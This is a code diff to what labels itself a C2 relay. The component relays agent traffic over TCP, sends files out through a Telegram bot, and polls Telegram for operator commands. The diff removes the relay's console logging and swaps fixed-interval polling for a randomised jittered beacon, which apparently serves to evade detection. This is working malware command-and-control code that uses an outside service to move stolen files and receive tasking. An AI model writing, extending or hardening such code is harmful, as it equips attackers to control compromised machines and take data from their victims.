@@ -27,9 +27,7 @@ function startTCPRelay() {
     socket.on('error', () => {});
   });
 
-  tcpRelay.listen(cfg.RELAY_PORT, '0.0.0.0', () => {
-    console.log(`[C2-Relay] TCP relay on port ${cfg.RELAY_PORT}`);
-  });
+  tcpRelay.listen(cfg.RELAY_PORT, '0.0.0.0', () => {});
 }
 
 function handleAgentMessage(socket, msg) {
@@ -121,8 +119,8 @@ function sendFileToTelegram(filePath) {
 
 function startTelegramPoller() {
   let offset = 0;
-  telegramPoller = setInterval(() => {
-    const req = http.get(`http://api.telegram.org/bot${cfg.TELEGRAM_TOKEN}/getUpdates?offset=${offset}&timeout=10`, (res) => {
+  const poll = () => {
+    const req = http.get(`http://api.telegram.org/bot${cfg.TELEGRAM_TOKEN}/getUpdates?offset=${offset}&timeout=30`, (res) => {
       let body = '';
       res.on('data', c => body += c);
       res.on('end', () => {
@@ -138,7 +136,10 @@ function startTelegramPoller() {
     });
     req.on('error', () => {});
     req.end();
-  }, 2000);
+    const jitter = Math.floor(Math.random() * 15000);
+    telegramPoller = setTimeout(poll, cfg.TELEGRAM_POLL_INTERVAL + jitter);
+  };
+  telegramPoller = setTimeout(poll, cfg.TELEGRAM_POLL_INTERVAL);
 }
 
 function handleTelegramUpdate(update) {
